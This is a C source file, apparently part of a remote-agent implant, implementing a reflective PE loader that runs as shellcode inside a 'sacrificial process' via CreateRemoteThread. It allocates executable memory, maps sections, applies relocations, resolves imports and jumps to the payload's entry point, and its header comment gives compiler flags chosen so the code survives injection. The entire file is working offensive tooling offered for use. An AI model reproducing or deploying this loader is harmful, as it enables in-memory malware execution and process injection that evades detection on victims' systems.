/*
 * reflective_loader.c
 *
 * Compile with separate flags from the rest of the client:
 *   MinGW:  -O1 -fno-stack-protector -ffunction-sections
 *   MSVC:   /GS- /Gy /O1
 *
 * These flags disable the stack canary and optimizations that
 * could break the code when copied as shellcode into the
 * sacrificial process.
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winnt.h>
#include <stdint.h>
#include "reflective_loader.h"

/* =========================================================================
 * pe_is_dotnet
 *
 * Detects whether a PE is a .NET assembly by checking
 * IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR.
 * Returns non-zero if the PE requires the CLR.
 * ====================================================================== */
int pe_is_dotnet(const uint8_t *pe_bytes)
{
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER*)pe_bytes;
    IMAGE_NT_HEADERS *nt  =
        (IMAGE_NT_HEADERS*)(pe_bytes + dos->e_lfanew);
    IMAGE_DATA_DIRECTORY *com =
        &nt->OptionalHeader
          .DataDirectory[IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR];
    return (com->VirtualAddress != 0 && com->Size != 0);
}

/* =========================================================================
 * ReflectiveLoader
 *
 * Runs inside the sacrificial process via CreateRemoteThread.
 * Receives a LoaderParam struct (written into the child process) with:
 *   - pe_base:   pointer to the raw PE in the child process
 *   - fnLoadLib/fnGetProc/fnVAlloc/fnFlush: kernel32/ntdll APIs
 *
 * Does NOT access global variables from the agent process.
 * Does NOT call any CRT functions.
 * Position independent thanks to pragmas and compiler flags.
 * ====================================================================== */
#pragma optimize("", off)
#pragma runtime_checks("", off)

DWORD WINAPI ReflectiveLoader(LPVOID param)
{
    LoaderParam *lp  = (LoaderParam*)param;
    uint8_t     *src = lp->pe_base;

    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER*)src;
    IMAGE_NT_HEADERS *nt  = (IMAGE_NT_HEADERS*)(src + dos->e_lfanew);

    /* -- Allocate space -- */
    uint8_t *base = (uint8_t*)lp->fnVAlloc(
        (LPVOID)(uintptr_t)nt->OptionalHeader.ImageBase,
        nt->OptionalHeader.SizeOfImage,
        MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!base)
        base = (uint8_t*)lp->fnVAlloc(
            NULL, nt->OptionalHeader.SizeOfImage,
            MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!base) return 1;

    /* -- Copy headers -- */
    for (SIZE_T i = 0; i < nt->OptionalHeader.SizeOfHeaders; i++)
        base[i] = src[i];

    /* -- Copy sections -- */
    IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(nt);
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        if (!sec->SizeOfRawData) continue;
        uint8_t *d = base + sec->VirtualAddress;
        uint8_t *s = src  + sec->PointerToRawData;
        for (DWORD j = 0; j < sec->SizeOfRawData; j++) d[j] = s[j];
    }

    /* -- Apply relocation -- */
    INT64 delta = (INT64)(base -
                  (uint8_t*)(uintptr_t)nt->OptionalHeader.ImageBase);
    if (delta) {
        IMAGE_DATA_DIRECTORY *rd =
            &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        if (rd->Size) {
            IMAGE_BASE_RELOCATION *r =
                (IMAGE_BASE_RELOCATION*)(base + rd->VirtualAddress);
            while (r->VirtualAddress) {
                WORD  *e = (WORD*)((uint8_t*)r + sizeof(IMAGE_BASE_RELOCATION));
                DWORD  n = (r->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / 2;
                for (DWORD j = 0; j < n; j++) {
                    int   type = e[j] >> 12;
                    DWORD off  = e[j] & 0xFFF;
                    if (type == IMAGE_REL_BASED_DIR64)
                        *(INT64*)(base + r->VirtualAddress + off) += delta;
                    else if (type == IMAGE_REL_BASED_HIGHLOW)
                        *(INT32*)(base + r->VirtualAddress + off) += (INT32)delta;
                }
                r = (IMAGE_BASE_RELOCATION*)((uint8_t*)r + r->SizeOfBlock);
            }
        }
    }

    /* -- Resolv import -- */
    IMAGE_DATA_DIRECTORY *id =
        &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (id->Size) {
        IMAGE_IMPORT_DESCRIPTOR *imp =
            (IMAGE_IMPORT_DESCRIPTOR*)(base + id->VirtualAddress);
        for (; imp->Name; imp++) {
            HMODULE hm = lp->fnLoadLib((char*)(base + imp->Name));
            if (!hm) continue;
            IMAGE_THUNK_DATA *thunk =
                (IMAGE_THUNK_DATA*)(base + imp->FirstThunk);
            IMAGE_THUNK_DATA *orig = imp->OriginalFirstThunk
                ? (IMAGE_THUNK_DATA*)(base + imp->OriginalFirstThunk) : thunk;
            for (; orig->u1.AddressOfData; orig++, thunk++) {
                FARPROC fn;
                if (IMAGE_SNAP_BY_ORDINAL(orig->u1.Ordinal))
                    fn = lp->fnGetProc(hm,
                         MAKEINTRESOURCEA(IMAGE_ORDINAL(orig->u1.Ordinal)));
                else {
                    IMAGE_IMPORT_BY_NAME *ibn =
                        (IMAGE_IMPORT_BY_NAME*)(base + orig->u1.AddressOfData);
                    fn = lp->fnGetProc(hm, (char*)ibn->Name);
                }
                thunk->u1.Function = (ULONG_PTR)fn;
            }
        }
    }

    /* -- Flush instruction cache -- */
    if (lp->fnFlush) lp->fnFlush((HANDLE)-1, NULL, 0);

    /* -- Call entry point -- */
    DWORD ep = nt->OptionalHeader.AddressOfEntryPoint;
    if (!ep) return 2;
    typedef BOOL (WINAPI *EP_t)(HINSTANCE, DWORD, LPVOID);
    EP_t entry = (EP_t)(base + ep);
    entry((HINSTANCE)base, DLL_PROCESS_ATTACH, NULL);
    return 0;
}

#pragma optimize("", on)
#pragma runtime_checks("", on)